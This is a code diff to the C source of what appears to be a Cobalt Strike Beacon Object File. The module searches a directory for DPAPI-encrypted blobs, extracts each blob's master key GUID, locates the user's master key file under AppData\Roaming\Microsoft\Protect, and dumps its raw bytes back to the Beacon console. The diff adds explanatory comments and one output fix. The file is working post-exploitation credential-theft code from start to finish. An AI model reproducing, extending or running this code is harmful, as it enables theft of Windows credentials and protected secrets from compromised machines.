@@ -3,7 +3,8 @@
 #include "beacon.h"
 
 //////////////////////////////////////
-// DFR Declarations
+// DFR (Dynamic Function Resolution)
+// These allow the BOF to call Win32 APIs without being linked to DLLs at compile-time.
 //////////////////////////////////////
 DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
 DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
@@ -29,7 +30,7 @@ DECLSPEC_IMPORT int    WINAPI MSVCRT$strcmp(const char*, const char*);
 DECLSPEC_IMPORT int    WINAPI MSVCRT$_snprintf(char*, size_t, const char*, ...);
 DECLSPEC_IMPORT int    WINAPI MSVCRT$_vsnprintf(char*, size_t, const char*, va_list);
 
-// map to the DFR because i will forget
+// Utility macros to make the code look like standard C
 #define malloc    MSVCRT$malloc
 #define free      MSVCRT$free
 #define memcpy    MSVCRT$memcpy
@@ -37,10 +38,11 @@ DECLSPEC_IMPORT int    WINAPI MSVCRT$_vsnprintf(char*, size_t, const char*, va_l
 #define strcmp    MSVCRT$strcmp
 #define snprintf  MSVCRT$_snprintf
 
-// Global output object
+// Global output object managed by BeaconFormat API
 formatp outputbuffer;
 BOOL g_DUMP_RAW = FALSE;
 
+// Helper to read a file and append its hex representation to the output buffer
 void dumpFileBytes(char* filePath) {
     if (!g_DUMP_RAW) return;
 
@@ -56,6 +58,7 @@ void dumpFileBytes(char* filePath) {
         BeaconFormatPrintf(&outputbuffer, "[*] Raw bytes for %s (%d bytes):\n", filePath, bytesRead);
         for (DWORD i = 0; i < bytesRead; i++) {
             BeaconFormatPrintf(&outputbuffer, "\\x%02X", (unsigned char)buffer[i]);
+            // Format output into 32-byte chunks for readability
             if ((i + 1) % 32 == 0) BeaconFormatPrintf(&outputbuffer, "\n");
         }
         BeaconFormatPrintf(&outputbuffer, "\n[+] End of Dump\n");
@@ -63,6 +66,7 @@ void dumpFileBytes(char* filePath) {
     KERNEL32$CloseHandle(hFile);
 }
 
+// Simple byte-pattern search function (equivalent to memstr)
 int IndexOfBytes(char* source, int sourceLen, char* pattern, int patternLen) {
     if (!source || !pattern || patternLen == 0 || sourceLen < patternLen) return -1;
     for (int i = 0; i <= sourceLen - patternLen; i++) {
@@ -75,6 +79,7 @@ int IndexOfBytes(char* source, int sourceLen, char* pattern, int patternLen) {
     return -1;
 }
 
+// Reverses a byte array in-place (used for converting little-endian GUID components)
 void reverseBytes(char* array, int len) {
     for (int i = 0; i < len / 2; i++) {
         char temp = array[i];
@@ -83,6 +88,7 @@ void reverseBytes(char* array, int len) {
     }
 }
 
+// Core logic: Parses a DPAPI blob to extract the associated Master Key GUID
 void parseFile(char* filePath) {
     HANDLE hFile = INVALID_HANDLE_VALUE;
     char buffer[1024];
@@ -98,6 +104,7 @@ void parseFile(char* filePath) {
     }
     KERNEL32$CloseHandle(hFile);
 
+    // DPAPI Blob header "magic" bytes (Version 1, Provider GUID: {df9d8cd0-1501-11d1-8c7a-00c04fc297eb})
     static char magic[] = { 0x01,0x00,0x00,0x00,0xD0,0x8C,0x9D,0xDF,0x01,0x15,0xD1,0x11,0x8C,0x7A,0x00,0xC0,0x4F,0xC2,0x97,0xEB };
     int idx = IndexOfBytes(buffer, (int)bytesRead, magic, sizeof(magic));
 
@@ -105,15 +112,19 @@ void parseFile(char* filePath) {
         BeaconFormatPrintf(&outputbuffer, "[+] Found DPAPI blob: %s\n", filePath);
         dumpFileBytes(filePath);
 
+        // Extract Master Key GUID (starts 24 bytes after the magic header)
         char mkGuidRaw[16];
         memcpy(mkGuidRaw, buffer + idx + 24, 16);
 
+        // Break down GUID into components to handle little-endian formatting
         char g1[4], g2[2], g3[2], g4[2], g5[6];
         memcpy(g1, mkGuidRaw, 4); memcpy(g2, mkGuidRaw + 4, 2); memcpy(g3, mkGuidRaw + 6, 2);
         memcpy(g4, mkGuidRaw + 8, 2); memcpy(g5, mkGuidRaw + 10, 6);
 
+        // DPAPI GUIDs store the first three blocks in Little-Endian
         reverseBytes(g1, 4); reverseBytes(g2, 2); reverseBytes(g3, 2);
 
+        // Format raw bytes into a standard GUID string (e.g., AAAAAAAA-BBBB-CCCC-DDDD-EEEEEEEEEEEE)
         char guidStr[37];
         snprintf(guidStr, sizeof(guidStr), 
             "%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
@@ -122,6 +133,7 @@ void parseFile(char* filePath) {
             (unsigned char)g4[0], (unsigned char)g4[1], (unsigned char)g5[0], (unsigned char)g5[1],
             (unsigned char)g5[2], (unsigned char)g5[3], (unsigned char)g5[4], (unsigned char)g5[5]);
 
+        // Get current user SID to build the path to the expected Master Key file
         HANDLE hToken;
         if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
             DWORD len = 0;
@@ -131,12 +143,12 @@ void parseFile(char* filePath) {
                 if (ADVAPI32$ConvertSidToStringSidA(pTUser->User.Sid, &szSid)) {
                     char szProfilePath[MAX_PATH];
                     if (KERNEL32$GetEnvironmentVariableA("USERPROFILE", szProfilePath, MAX_PATH) > 0) {
+                        // Construct path to the Master Key file in AppData
                         char mkPath[MAX_PATH];
                         snprintf(mkPath, MAX_PATH, "%s\\AppData\\Roaming\\Microsoft\\Protect\\%s\\%s", 
                                  szProfilePath, szSid, guidStr);
                         
                         BeaconFormatPrintf(&outputbuffer, "[*] Master Key GUID: %s\n", guidStr);
-                        //BeaconFormatPrintf(&outputbuffer, "[*] Attempting to dump Master Key: %s\n", mkPath);
                         dumpFileBytes(mkPath);
                     }
                     KERNEL32$LocalFree(szSid);
@@ -148,24 +160,26 @@ void parseFile(char* filePath) {
     }
 }
 
+// Entry point for the BOF
 void go(char* args, int len) {
     datap parser;
     char* searchMask = NULL;
     int searchMaskLen = 0;
     int dumpFlag = 0;
 
+    // Extract arguments passed from the Aggressor Script
     BeaconDataParse(&parser, args, len);
     searchMask = BeaconDataExtract(&parser, &searchMaskLen);
     dumpFlag = BeaconDataInt(&parser);
     g_DUMP_RAW = (dumpFlag == 1) ? TRUE : FALSE;
 
-    // initialize with 16KB - might be able to go lower here?
+    // Allocate the dynamic output buffer (initially 16KB)
     BeaconFormatAlloc(&outputbuffer, 16384);
 
     if (searchMask == NULL) {
         BeaconFormatPrintf(&outputbuffer, "[-] No search path provided.\n");
     } else {
-        // strip the * to get the base directory for path concatenation
+        // Prepare the directory path for file concatenation
         char baseDir[MAX_PATH];
         snprintf(baseDir, MAX_PATH, "%s", searchMask);
         int maskLen = (int)strlen(baseDir);
@@ -173,13 +187,15 @@ void go(char* args, int len) {
             baseDir[maskLen - 1] = '\0';
         }
 
+        // Standard Windows API directory iteration
         WIN32_FIND_DATAA fd;
         HANDLE hFind = KERNEL32$FindFirstFileA(searchMask, &fd);
 
         if (hFind == INVALID_HANDLE_VALUE) {
-            printf("[-] Path not found: %s\n", searchMask);
+            BeaconFormatPrintf(&outputbuffer, "[-] Path not found: %s\n", searchMask);
         } else {
             do {            
+                // Skip the '.' and '..' directory entries
                 if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0) {
                     char fullPath[MAX_PATH];
                     snprintf(fullPath, MAX_PATH, "%s%s", baseDir, fd.cFileName);                    
@@ -192,9 +208,9 @@ void go(char* args, int len) {
 
     BeaconFormatPrintf(&outputbuffer, "[+] BOF Finished.\n");
 
-    // 2. PRINT: Send the final result
+    // Flush the dynamic buffer to the Beacon console
     BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
 
-    // 3. FREE: Clean up the heap
+    // Release the heap memory back to the system
     BeaconFormatFree(&outputbuffer);
 }
